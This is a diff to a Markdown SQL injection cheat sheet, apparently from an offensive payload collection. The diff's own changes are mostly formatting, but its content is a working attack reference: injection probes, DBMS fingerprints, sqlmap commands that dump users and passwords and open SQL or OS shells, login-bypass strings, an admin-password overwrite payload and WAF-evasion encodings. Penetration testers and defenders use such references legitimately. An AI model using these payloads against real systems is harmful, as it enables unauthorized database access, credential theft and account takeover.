@@ -1,7 +1,9 @@
 # SQL injection
+
 A SQL injection attack consists of insertion or "injection" of a SQL query via the input data from the client to the application
 
 ## Summary
+
 * [CheatSheet MSSQL Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20injection/MSSQL%20Injection.md)
 * [CheatSheet MySQL Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20injection/MySQL%20Injection.md)
 * [CheatSheet OracleSQL Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20injection/OracleSQL%20Injection.md)
@@ -16,10 +18,11 @@ A SQL injection attack consists of insertion or "injection" of a SQL query via t
 * [Insert Statement - ON DUPLICATE KEY UPDATE](#insert-statement---on-duplicate-key-update)
 * [WAF Bypass](#waf-bypass)
 
-
 ## Entry point detection
+
 Detection of an SQL injection entry point
 Simple characters
+
 ```sql
 '
 %27
@@ -34,12 +37,14 @@ Wildcard (*)
 ```
 
 Multiple encoding
+
 ```sql
 %%2727
 %25%27
 ```
 
 Merging characters
+
 ```sql
 `+HERP
 '||'DERP
@@ -50,7 +55,8 @@ Merging characters
 ```
 
 Logic Testing
-```
+
+```sql
 page.asp?id=1 or 1=1 -- true
 page.asp?id=1' or 1=1 -- true
 page.asp?id=1" or 1=1 -- true
@@ -58,7 +64,8 @@ page.asp?id=1 and 1=2 -- false
 ```
 
 Weird characters
-```
+
+```sql
 Unicode character U+02BA MODIFIER LETTER DOUBLE PRIME (encoded as %CA%BA) was
 transformed into U+0022 QUOTATION MARK (")
 Unicode character U+02B9 MODIFIER LETTER PRIME (encoded as %CA%B9) was
@@ -66,6 +73,7 @@ transformed into U+0027 APOSTROPHE (')
 ```
 
 ## DBMS Identification
+
 ```c
 ["conv('a',16,2)=conv('a',16,2)"                   ,"MYSQL"],
 ["connection_id()=connection_id()"                 ,"MYSQL"],
@@ -94,27 +102,31 @@ transformed into U+0027 APOSTROPHE (')
 ["'i'='i'",     "MSACCESS,SQLITE,POSTGRESQL,ORACLE,MSSQL,MYSQL"],
 ```
 
-
 ## SQL injection using SQLmap
+
 Basic arguments for SQLmap
-```
+
+```powershell
 sqlmap --url="<url>" -p username --user-agent=SQLMAP --random-agent --threads=10 --risk=3 --level=5 --eta --dbms=MySQL --os=Linux --banner --is-dba --users --passwords --current-user --dbs
 ```
 
 Custom injection in UserAgent/Header/Referer/Cookie
-```
+
+```powershell
 python sqlmap.py -u "http://example.com" --data "username=admin&password=pass"  --headers="x-forwarded-for:127.0.0.1*"
 The injection is located at the '*'
 ```
 
 Second order injection
-```
+
+```powershell
 python sqlmap.py -r /tmp/r.txt --dbms MySQL --second-order "http://targetapp/wishlist" -v 3
 sqlmap -r 1.txt -dbms MySQL -second-order "http://<IP/domain>/joomla/administrator/index.php" -D "joomla" -dbs
 ```
 
 Shell
-```
+
+```powershell
 SQL Shell
 python sqlmap.py -u "http://example.com/?id=1"  -p id --sql-shell
 
@@ -126,12 +138,14 @@ python sqlmap.py -u "http://example.com/?id=1"  -p id --os-pwn
 ```
 
 Using suffix to tamper the injection
-```
+
+```powershell
 python sqlmap.py -u "http://example.com/?id=1"  -p id --suffix="-- "
 ```
 
 General tamper option and tamper's list
-```
+
+```powershell
 tamper=name_of_the_tamper
 ```
 
@@ -184,6 +198,7 @@ tamper=name_of_the_tamper
 |xforwardedfor.py | Append a fake HTTP header 'X-Forwarded-For'|
 
 ## Authentication bypass
+
 ```sql
 '-'
 ' '
@@ -277,19 +292,22 @@ admin") or "1"="1"/*
 1234 " AND 1=0 UNION ALL SELECT "admin", "81dc9bdb52d04dc20036dbd8313ed055
 ```
 
-
 ## Polyglot injection (multicontext)
+
 ```sql
 SLEEP(1) /*' or SLEEP(1) or '" or SLEEP(1) or "*/
 ```
 
-## Second order injection
+## Routed injection
+
 ```sql
 admin' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055'
 ```
 
 ## Insert Statement - ON DUPLICATE KEY UPDATE
+
 ON DUPLICATE KEY UPDATE keywords is used to tell MySQL what to do when the application tries to insert a row that already exists in the table. We can use this to change the admin password by:
+
 ```sql
 Inject using payload:
   attacker_dummy@example.com", "bcrypt_hash_of_qwerty"), ("admin@example.com", "bcrypt_hash_of_qwerty") ON DUPLICATE KEY UPDATE password="bcrypt_hash_of_qwerty" --
@@ -303,10 +321,10 @@ Because this row already exists, the ON DUPLICATE KEY UPDATE keyword tells MySQL
 After this, we can simply authenticate with “admin@example.com” and the password “qwerty”!
 ```
 
-
 ## WAF Bypass
 
 No Space (%20) - bypass using whitespace alternatives
+
 ```sql
 ?id=1%09and%091=1%09--
 ?id=1%0Dand%0D1=1%0D--
@@ -317,16 +335,19 @@ No Space (%20) - bypass using whitespace alternatives
 ```
 
 No Whitespace - bypass using comments
+
 ```sql
 ?id=1/*comment*/and/**/1=1/**/--
 ```
 
 No Whitespace - bypass using parenthesis
+
 ```sql
 ?id=(1)and(1)=(1)--
 ```
 
 No Comma - bypass using OFFSET, FROM and JOIN
+
 ```sql
 LIMIT 0,1         -> LIMIT 1 OFFSET 0
 SUBSTR('SQL',1,1) -> SUBSTR('SQL' FROM 1 FOR 1).
@@ -334,6 +355,7 @@ SELECT 1,2,3,4    -> UNION SELECT * FROM (SELECT 1)a JOIN (SELECT 2)b JOIN (SELE
 ```
 
 Blacklist using keywords - bypass using uppercase/lowercase
+
 ```sql
 ?id=1 AND 1=1#
 ?id=1 AnD 1=1#
@@ -341,6 +363,7 @@ Blacklist using keywords - bypass using uppercase/lowercase
 ```
 
 Blacklist using keywords case insensitive - bypass using an equivalent operator
+
 ```sql
 AND   -> &&
 OR    -> ||
@@ -350,6 +373,7 @@ WHERE -> HAVING
 ```
 
 Information_schema.tables Alternative
+
 ```sql
 select * from mysql.innodb_table_stats;
 +----------------+-----------------------+---------------------+--------+----------------------+--------------------------+
@@ -367,10 +391,10 @@ mysql> show tables in dvwa;
 | guestbook      |
 | users          |
 +----------------+
-
 ```
 
 Version Alternative
+
 ```sql
 mysql> select @@innodb_version;
 +------------------+
@@ -394,37 +418,36 @@ mysql> mysql> select version();
 +-------------------------+
 ```
 
-
-
 ## Thanks to - Other resources
+
 * Detect SQLi
-  - [Manual SQL Injection Discovery Tips](https://gerbenjavado.com/manual-sql-injection-discovery-tips/)
-  - [NetSPI SQL Injection Wiki](https://sqlwiki.netspi.com/)
+  * [Manual SQL Injection Discovery Tips](https://gerbenjavado.com/manual-sql-injection-discovery-tips/)
+  * [NetSPI SQL Injection Wiki](https://sqlwiki.netspi.com/)
 * MySQL:
-  - [PentestMonkey's mySQL injection cheat sheet] (http://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheet)
-  - [Reiners mySQL injection Filter Evasion Cheatsheet] (https://websec.wordpress.com/2010/12/04/sqli-filter-evasion-cheat-sheet-mysql/)
-  - [Alternative for Information_Schema.Tables in MySQL](https://osandamalith.com/2017/02/03/alternative-for-information_schema-tables-in-mysql/)
-  - [The SQL Injection Knowledge base](https://websec.ca/kb/sql_injection)
+  * [PentestMonkey's mySQL injection cheat sheet] (http://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheet)
+  * [Reiners mySQL injection Filter Evasion Cheatsheet] (https://websec.wordpress.com/2010/12/04/sqli-filter-evasion-cheat-sheet-mysql/)
+  * [Alternative for Information_Schema.Tables in MySQL](https://osandamalith.com/2017/02/03/alternative-for-information_schema-tables-in-mysql/)
+  * [The SQL Injection Knowledge base](https://websec.ca/kb/sql_injection)
 * MSSQL:
-  - [EvilSQL's Error/Union/Blind MSSQL Cheatsheet] (http://evilsql.com/main/page2.php)
-  - [PentestMonkey's MSSQL SQLi injection Cheat Sheet] (http://pentestmonkey.net/cheat-sheet/sql-injection/mssql-sql-injection-cheat-sheet)
+  * [EvilSQL's Error/Union/Blind MSSQL Cheatsheet] (http://evilsql.com/main/page2.php)
+  * [PentestMonkey's MSSQL SQLi injection Cheat Sheet] (http://pentestmonkey.net/cheat-sheet/sql-injection/mssql-sql-injection-cheat-sheet)
 * ORACLE:
-  - [PentestMonkey's Oracle SQLi Cheatsheet] (http://pentestmonkey.net/cheat-sheet/sql-injection/oracle-sql-injection-cheat-sheet)
+  * [PentestMonkey's Oracle SQLi Cheatsheet] (http://pentestmonkey.net/cheat-sheet/sql-injection/oracle-sql-injection-cheat-sheet)
 * POSTGRESQL:
-  - [PentestMonkey's Postgres SQLi Cheatsheet] (http://pentestmonkey.net/cheat-sheet/sql-injection/postgres-sql-injection-cheat-sheet)
+  * [PentestMonkey's Postgres SQLi Cheatsheet] (http://pentestmonkey.net/cheat-sheet/sql-injection/postgres-sql-injection-cheat-sheet)
 * Others
-  - [SQLi Cheatsheet - NetSparker](https://www.netsparker.com/blog/web-security/sql-injection-cheat-sheet/)
-  - [Access SQLi Cheatsheet] (http://nibblesec.org/files/MSAccessSQLi/MSAccessSQLi.html)
-  - [PentestMonkey's Ingres SQL Injection Cheat Sheet] (http://pentestmonkey.net/cheat-sheet/sql-injection/ingres-sql-injection-cheat-sheet)
-  - [Pentestmonkey's DB2 SQL Injection Cheat Sheet] (http://pentestmonkey.net/cheat-sheet/sql-injection/db2-sql-injection-cheat-sheet)
-  - [Pentestmonkey's Informix SQL Injection Cheat Sheet] (http://pentestmonkey.net/cheat-sheet/sql-injection/informix-sql-injection-cheat-sheet)
-  - [SQLite3 Injection Cheat sheet] (https://sites.google.com/site/0x7674/home/sqlite3injectioncheatsheet)
-  - [Ruby on Rails (Active Record) SQL Injection Guide] (http://rails-sqli.org/)
-  - [ForkBombers SQLMap Tamper Scripts Update](http://www.forkbombers.com/2016/07/sqlmap-tamper-scripts-update.html)
-  - [SQLi in INSERT worse than SELECT](https://labs.detectify.com/2017/02/14/sqli-in-insert-worse-than-select/)
-  - [Manual SQL Injection Tips](https://gerbenjavado.com/manual-sql-injection-discovery-tips/)
+  * [SQLi Cheatsheet - NetSparker](https://www.netsparker.com/blog/web-security/sql-injection-cheat-sheet/)
+  * [Access SQLi Cheatsheet] (http://nibblesec.org/files/MSAccessSQLi/MSAccessSQLi.html)
+  * [PentestMonkey's Ingres SQL Injection Cheat Sheet] (http://pentestmonkey.net/cheat-sheet/sql-injection/ingres-sql-injection-cheat-sheet)
+  * [Pentestmonkey's DB2 SQL Injection Cheat Sheet] (http://pentestmonkey.net/cheat-sheet/sql-injection/db2-sql-injection-cheat-sheet)
+  * [Pentestmonkey's Informix SQL Injection Cheat Sheet] (http://pentestmonkey.net/cheat-sheet/sql-injection/informix-sql-injection-cheat-sheet)
+  * [SQLite3 Injection Cheat sheet] (https://sites.google.com/site/0x7674/home/sqlite3injectioncheatsheet)
+  * [Ruby on Rails (Active Record) SQL Injection Guide] (http://rails-sqli.org/)
+  * [ForkBombers SQLMap Tamper Scripts Update](http://www.forkbombers.com/2016/07/sqlmap-tamper-scripts-update.html)
+  * [SQLi in INSERT worse than SELECT](https://labs.detectify.com/2017/02/14/sqli-in-insert-worse-than-select/)
+  * [Manual SQL Injection Tips](https://gerbenjavado.com/manual-sql-injection-discovery-tips/)
 * Second Order:
-  - [Analyzing CVE-2018-6376 – Joomla!, Second Order SQL Injection](https://www.notsosecure.com/analyzing-cve-2018-6376/)
-  - [Exploiting Second Order SQLi Flaws by using Burp & Custom Sqlmap Tamper](https://pentest.blog/exploiting-second-order-sqli-flaws-by-using-burp-custom-sqlmap-tamper/)
+  * [Analyzing CVE-2018-6376 – Joomla!, Second Order SQL Injection](https://www.notsosecure.com/analyzing-cve-2018-6376/)
+  * [Exploiting Second Order SQLi Flaws by using Burp & Custom Sqlmap Tamper](https://pentest.blog/exploiting-second-order-sqli-flaws-by-using-burp-custom-sqlmap-tamper/)
 * Sqlmap:
-  - [#SQLmap protip @zh4ck](https://twitter.com/zh4ck/status/972441560875970560)
+  * [#SQLmap protip @zh4ck](https://twitter.com/zh4ck/status/972441560875970560)
